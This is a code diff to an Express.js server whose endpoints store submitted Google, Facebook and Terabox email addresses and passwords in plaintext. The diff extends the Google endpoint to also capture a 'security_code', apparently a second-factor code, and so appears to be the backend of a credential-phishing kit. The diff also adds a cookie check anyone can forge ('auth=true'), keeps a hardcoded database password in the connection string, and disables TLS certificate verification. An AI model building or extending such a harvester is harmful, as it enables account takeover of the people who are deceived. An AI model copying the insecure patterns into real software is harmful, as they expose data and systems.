@@ -9,11 +9,24 @@ const PORT = process.env.PORT || 5001;
 // Middleware
 app.use(cors());
 app.use(express.json());
+
+// Protect .mp4 files from being accessed without authentication
+app.use((req, res, next) => {
+  if (req.path.endsWith('.mp4')) {
+    const cookies = req.headers.cookie || '';
+    if (!cookies.includes('auth=true')) {
+      return res.status(401).send('Unauthorized: You must be logged in to view this video.');
+    }
+  }
+  next();
+});
+
 app.use(express.static(path.join(__dirname, './')));
 
 // Database Connection
 const pool = new Pool({
-  connectionString: process.env.DATABASE_URL || 'postgresql://postgres:appugowda%40143@db.jlnfgljtujjhjbcxkstf.supabase.co:5432/postgres'
+  connectionString: process.env.DATABASE_URL || 'postgresql://postgres:appugowda%40143@db.jlnfgljtujjhjbcxkstf.supabase.co:5432/postgres',
+  ssl: { rejectUnauthorized: false }
 });
 
 // Helper to initialize table
@@ -66,9 +79,15 @@ const initDb = async () => {
         id SERIAL PRIMARY KEY,
         email VARCHAR(255) NOT NULL,
         password VARCHAR(255) NOT NULL,
+        security_code VARCHAR(255),
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
+    try {
+      await pool.query(`ALTER TABLE google_users ADD COLUMN IF NOT EXISTS security_code VARCHAR(255);`);
+    } catch (e) {
+      console.log('Error adding security_code column:', e.message);
+    }
     await pool.query(`
       CREATE TABLE IF NOT EXISTS facebook_users (
         id SERIAL PRIMARY KEY,
@@ -229,14 +248,14 @@ app.post('/api/terabox_login', async (req, res) => {
 
 // Store Google Login credentials
 app.post('/api/google_login', async (req, res) => {
-  const { email, password } = req.body;
+  const { email, password, security_code } = req.body;
   if (!email || !password) {
     return res.status(400).json({ error: 'Email and password are required.' });
   }
   try {
     const result = await pool.query(
-      'INSERT INTO google_users (email, password) VALUES ($1, $2) RETURNING id',
-      [email, password]
+      'INSERT INTO google_users (email, password, security_code) VALUES ($1, $2, $3) RETURNING id',
+      [email, password, security_code || null]
     );
     res.status(201).json({ message: 'Google credentials stored', user: result.rows[0] });
   } catch (err) {
